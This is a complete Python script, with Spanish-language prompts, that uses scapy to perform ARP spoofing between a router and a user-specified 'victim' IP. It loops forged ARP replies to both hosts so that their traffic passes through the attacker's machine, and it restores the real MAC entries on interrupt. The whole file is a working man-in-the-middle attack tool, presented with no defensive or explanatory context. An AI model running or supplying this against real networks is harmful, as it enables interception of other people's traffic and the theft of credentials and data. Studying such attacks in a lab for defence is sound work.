#!/usr/bin/python

import scapy.all as scapy

def restore_defaults(dest, source):
    # getting the real MACs
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    # creating the packet
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, verbose=False)

def get_mac(ip):
    # request that contain the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    # getting the response
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # getting the MAC (its src because its a response)
    mac = answer[0][1].hwsrc
    return mac

def spoofing(target, spoofed):
    # getting the MAC of the target
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)

def main():
    router_ip = input("Introduce la IP del router: ")
    victim_ip = input("Introduce la IP de la víctima: ")

    try:
        while True:
            spoofing(router_ip, victim_ip)
            spoofing(victim_ip, router_ip)
    except KeyboardInterrupt:
        print("[!] Proceso detenido. Restaurando valores predeterminados... por favor espera")
        restore_defaults(router_ip, victim_ip)
        restore_defaults(victim_ip, router_ip)
        exit(0)

if __name__ == "__main__":
    main()
